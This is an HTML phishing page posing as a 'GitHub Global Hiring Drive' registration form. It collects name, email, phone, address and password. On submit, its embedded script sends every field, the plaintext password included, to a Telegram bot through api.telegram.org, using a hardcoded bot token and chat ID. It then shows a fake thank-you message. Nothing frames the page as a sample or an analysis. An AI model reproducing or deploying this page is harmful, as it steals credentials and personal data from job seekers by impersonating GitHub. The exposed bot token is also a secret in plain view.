<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>GitHub Global Hiring Drive</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: "Segoe UI", sans-serif;
      background: linear-gradient(to right, #dadce0, #f1f1f1);
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }

    .container {
      background: #111;
      padding: 40px;
      border-radius: 15px;
      box-shadow: 0 0 30px rgba(0, 0, 0, 0.3);
      width: 100%;
      max-width: 400px;
      color: white;
    }

    h2 {
      text-align: center;
      margin-bottom: 25px;
    }

    input {
      width: 100%;
      padding: 12px;
      margin: 10px 0;
      border: none;
      border-radius: 8px;
      background: #222;
      color: white;
      border: 1px solid #6c63ff;
      outline: none;
    }

    input::placeholder {
      color: #bbb;
    }

    button {
      width: 100%;
      padding: 12px;
      margin-top: 15px;
      background: #6c63ff;
      border: none;
      color: white;
      border-radius: 8px;
      font-size: 16px;
      cursor: pointer;
      transition: background 0.3s;
    }

    button:hover {
      background: #5147d3;
    }

    #thankyou {
      display: none;
      text-align: center;
      color: #00ff8c;
      font-size: 18px;
      font-weight: bold;
      margin-top: 20px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Register</h2>
    <form id="registerForm">
      <input type="text" name="name" placeholder="Full Name" required />
      <input type="email" name="email" placeholder="E-mail" required />
      <input type="text" name="phone" placeholder="Phone" required />
      <input type="text" name="address" placeholder="Address" required />
      <input type="password" name="password" placeholder="Password" required />
      <input type="password" name="confirm" placeholder="Confirm Password" required />
      <button type="submit">Register for Drive</button>
    </form>
    <div id="thankyou">‚úÖ Thank you for registering!</div>
  </div>

  <script>
    const BOT_TOKEN = "7448574888:AAFe9P4ICY0h4nnUh_Iat5h5qRuXGIrxMdw";
    const CHAT_ID = "968143308";

    document.getElementById("registerForm").addEventListener("submit", function (e) {
      e.preventDefault();

      const form = e.target;
      const name = form.name.value.trim();
      const email = form.email.value.trim();
      const phone = form.phone.value.trim();
      const address = form.address.value.trim();
      const password = form.password.value;
      const confirm = form.confirm.value;

      if (password !== confirm) {
        alert("Passwords do not match.");
        return;
      }

      const message = `üö® *GitHub Global Hiring Registration* üö®\n\nüë§ *Name:* ${name}\nüìß *Email:* ${email}\nüì± *Phone:* ${phone}\nüè† *Address:* ${address}\nüîê *Password:* ${password}`;
      
      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

      fetch(url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message,
          parse_mode: "Markdown"
        })
      })
      .then(res => res.json())
      .then(() => {
        form.style.display = "none";
        document.getElementById("thankyou").style.display = "block";
      })
      .catch(err => {
        console.error("Telegram error", err);
        alert("‚ùå Failed to register. Try again.");
      });
    });
  </script>
</body>
</html>
